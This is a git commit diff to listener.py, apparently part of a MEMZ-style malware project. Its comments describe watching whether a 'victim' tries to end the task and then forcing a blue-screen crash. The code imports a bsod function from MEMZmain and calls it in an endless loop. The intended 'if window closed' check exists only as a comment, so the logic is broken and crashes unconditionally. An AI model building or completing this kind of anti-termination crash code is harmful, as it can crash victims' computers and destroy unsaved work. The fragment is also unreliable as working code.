60ff97b8ebe77bcdf628e98c7b348d93592797db
arenacloser-Z <166559903+arenacloser-Z@users.noreply.github.com>
2024-05-08 13:45:02 -0400

    Update listener.py

--- listener.py
+++ listener.py
@@ -1,3 +1,10 @@
-// this code will add a listener that makes sure the victim(even though this code is harmless) does not attempt to end the tast.
-// if this happens, the code will launch a barrage of errors that will result in a BSOD
-// this will likely be created into a seperate, larger project
+#this code will add a listener that makes sure the victim(even though this code is harmless) does not attempt to end the tast.
+#if this happens, the code will launch a barrage of errors that will result in a BSOD
+#this will likely be created into a seperate, larger project
+
+from MEMZmain import bsod
+
+while True:
+  #if window main closed(possible restart):
+    #run error code
+    bsod()
